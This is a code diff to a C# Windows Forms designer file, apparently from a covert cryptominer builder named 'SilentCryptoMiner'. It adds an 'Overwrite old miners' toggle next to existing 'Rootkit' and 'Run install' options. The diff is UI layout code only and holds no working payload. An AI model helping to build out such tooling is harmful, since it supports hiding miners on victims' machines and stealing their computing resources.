@@ -41,6 +41,8 @@ namespace SilentCryptoMiner
             this.formAdvancedOptions = new MephTheme();
             this.labelAdvancedOptionRunInstall = new System.Windows.Forms.Label();
             this.toggleRunInstall = new MephToggleSwitch();
+            this.labelAdvancedOptionOldMinerOverwrite = new System.Windows.Forms.Label();
+            this.toggleOldMinerOverwrite = new MephToggleSwitch();
             this.picAdmin1 = new System.Windows.Forms.PictureBox();
             this.labelAdvancedOptionRootkit = new System.Windows.Forms.Label();
             this.toggleRootkit = new MephToggleSwitch();
@@ -55,6 +57,8 @@ namespace SilentCryptoMiner
             this.formAdvancedOptions.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
             this.formAdvancedOptions.Controls.Add(this.labelAdvancedOptionRunInstall);
             this.formAdvancedOptions.Controls.Add(this.toggleRunInstall);
+            this.formAdvancedOptions.Controls.Add(this.labelAdvancedOptionOldMinerOverwrite);
+            this.formAdvancedOptions.Controls.Add(this.toggleOldMinerOverwrite);
             this.formAdvancedOptions.Controls.Add(this.picAdmin1);
             this.formAdvancedOptions.Controls.Add(this.labelAdvancedOptionRootkit);
             this.formAdvancedOptions.Controls.Add(this.toggleRootkit);
@@ -72,7 +76,7 @@ namespace SilentCryptoMiner
             this.labelAdvancedOptionRunInstall.BackColor = System.Drawing.Color.Transparent;
             this.labelAdvancedOptionRunInstall.Font = new System.Drawing.Font("Segoe UI", 9.5F);
             this.labelAdvancedOptionRunInstall.ForeColor = System.Drawing.Color.Gray;
-            this.labelAdvancedOptionRunInstall.Location = new System.Drawing.Point(13, 72);
+            this.labelAdvancedOptionRunInstall.Location = new System.Drawing.Point(13, 100);
             this.labelAdvancedOptionRunInstall.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
             this.labelAdvancedOptionRunInstall.Name = "labelAdvancedOptionRunInstall";
             this.labelAdvancedOptionRunInstall.Size = new System.Drawing.Size(170, 17);
@@ -84,11 +88,35 @@ namespace SilentCryptoMiner
             this.toggleRunInstall.BackColor = System.Drawing.Color.Transparent;
             this.toggleRunInstall.Checked = true;
             this.toggleRunInstall.ForeColor = System.Drawing.Color.Black;
-            this.toggleRunInstall.Location = new System.Drawing.Point(188, 69);
+            this.toggleRunInstall.Location = new System.Drawing.Point(188, 97);
             this.toggleRunInstall.Margin = new System.Windows.Forms.Padding(2);
             this.toggleRunInstall.Name = "toggleRunInstall";
             this.toggleRunInstall.Size = new System.Drawing.Size(50, 24);
             this.toggleRunInstall.TabIndex = 117;
+            // 
+            // labelAdvancedOptionOldMinerOverwrite
+            // 
+            this.labelAdvancedOptionOldMinerOverwrite.AutoEllipsis = true;
+            this.labelAdvancedOptionOldMinerOverwrite.BackColor = System.Drawing.Color.Transparent;
+            this.labelAdvancedOptionOldMinerOverwrite.Font = new System.Drawing.Font("Segoe UI", 9.5F);
+            this.labelAdvancedOptionOldMinerOverwrite.ForeColor = System.Drawing.Color.Gray;
+            this.labelAdvancedOptionOldMinerOverwrite.Location = new System.Drawing.Point(13, 72);
+            this.labelAdvancedOptionOldMinerOverwrite.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
+            this.labelAdvancedOptionOldMinerOverwrite.Name = "labelAdvancedOptionOldMinerOverwrite";
+            this.labelAdvancedOptionOldMinerOverwrite.Size = new System.Drawing.Size(170, 17);
+            this.labelAdvancedOptionOldMinerOverwrite.TabIndex = 116;
+            this.labelAdvancedOptionOldMinerOverwrite.Text = "Overwrite old miners:";
+            // 
+            // toggleOldMinerOverwrite
+            // 
+            this.toggleOldMinerOverwrite.BackColor = System.Drawing.Color.Transparent;
+            this.toggleOldMinerOverwrite.Checked = true;
+            this.toggleOldMinerOverwrite.ForeColor = System.Drawing.Color.Black;
+            this.toggleOldMinerOverwrite.Location = new System.Drawing.Point(188, 69);
+            this.toggleOldMinerOverwrite.Margin = new System.Windows.Forms.Padding(2);
+            this.toggleOldMinerOverwrite.Name = "toggleOldMinerOverwrite";
+            this.toggleOldMinerOverwrite.Size = new System.Drawing.Size(50, 24);
+            this.toggleOldMinerOverwrite.TabIndex = 115;
             // 
             // picAdmin1
             // 
@@ -152,6 +180,8 @@ namespace SilentCryptoMiner
         internal PictureBox picAdmin1;
         internal Label labelAdvancedOptionRootkit;
         internal MephToggleSwitch toggleRootkit;
+        internal Label labelAdvancedOptionOldMinerOverwrite;
+        internal MephToggleSwitch toggleOldMinerOverwrite;
         internal Label labelAdvancedOptionRunInstall;
         internal MephToggleSwitch toggleRunInstall;
     }
